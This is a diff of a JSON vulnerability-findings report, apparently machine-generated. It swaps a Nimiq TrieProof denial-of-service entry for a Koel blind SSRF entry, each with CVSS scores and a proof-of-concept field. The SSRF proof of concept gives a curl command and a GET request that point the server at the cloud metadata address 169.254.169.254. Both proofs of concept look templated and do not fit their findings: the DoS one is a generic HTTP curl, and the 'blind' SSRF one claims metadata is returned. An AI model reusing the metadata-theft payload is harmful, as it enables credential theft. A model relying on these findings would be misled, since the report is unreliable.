+                "https://www.tenable.com/cve/CVE-2026-62944"
             ]
         },
         {
-            "cve_id": "CVE-2026-54541",
-            "finding_name": "TrieProof Verification Panic in Nimiq-Primitives",
-            "description": "The TrieProof::verify function within nimiq-primitives incorrectly uses the unwrap method on the child_index during validation of keys with identical lengths. This implementation error results in an unhandled panic whenever a specific edge-case input is provided. An attacker could exploit this to trigger a denial-of-service against nodes validating such proofs.",
-            "cvss_score": 3.7,
-            "score_source": "estimated_unverified_recalculated",
-            "severity": "Low",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cve_id": "CVE-2026-54492",
+            "finding_name": "Authenticated Blind SSRF in Koel Podcasts",
+            "description": "Koel is vulnerable to authenticated blind server-side request forgery via the Subsonic podcast channel creation interface. The application fails to validate the target URL, allowing attackers to trigger outgoing HTTP requests to internal network segments. Because the application does not return the response directly, this represents a blind SSRF vector used for internal reconnaissance.",
+            "cvss_score": 4.3,
+            "score_source": "tenable_verified",
+            "severity": "Medium",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
             "cvss_breakdown": {
                 "Attack_Vector": "Network",
-                "Attack_Complexity": "High",
-                "Privileges_Required": "None",
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
                 "User_Interaction": "None",
                 "Scope": "Unchanged",
-                "Confidentiality": "None",
+                "Confidentiality": "Low",
                 "Integrity": "None",
-                "Availability": "Low"
+                "Availability": "None"
             },
-            "cwe_id": "CWE-248",
+            "cwe_id": "CWE-918",
             "mitre_mappings": [
-                "T1498"
+                "T1190"
             ],
-            "urgency_score": 28,
-            "poc": "An attacker creates a malformed TrieProof where two keys of equal length are present, designed to trigger the failed assertion in child_index. This proof is sent to the target node's network interface. Upon processing the proof, the TrieProof::verify method invokes unwrap on a null or missing child index. The resulting panic causes the thread or process to exit, successfully disrupting availability.\n\n**Technical Details:**\n```\nAn attacker sends a specially crafted input that triggers resource exhaustion.\nFor example, a deeply nested structure or a massive list can consume CPU or memory.\n**curl command (conceptual):**\n```bash\ncurl \"https://target.com/vulnerable-endpoint?payload=<malicious_input>\"\n```\nThe server becomes unresponsive or crashes, confirming the denial of service.",
+            "urgency_score": 39,
+            "poc": "An authenticated user provides a URL targeting an internal port on the host machine during podcast creation. The application attempts to connect to the provided URL for channel metadata. The attacker observes the time taken for the request to return, allowing them to map open and closed ports on the internal network. This reconnaissance facilitates further exploitation of services behind the server's firewall.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-54541",
-                "https://www.cve.org/CVERecord?id=CVE-2026-54541",
-                "https://www.tenable.com/cve/CVE-2026-54541"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-54492",
+                "https://www.cve.org/CVERecord?id=CVE-2026-54492",
+                "https://www.tenable.com/cve/CVE-2026-54492"
             ]
         }
     ],
     "severity_stats": {
-        "Critical": 4,
-        "High": 8,
+        "Critical": 5,
+        "High": 9,
         "Medium": 6,
-        "Low": 2,
+        "Low": 0,
         "Unknown": 0,
         "Total": 20
     }
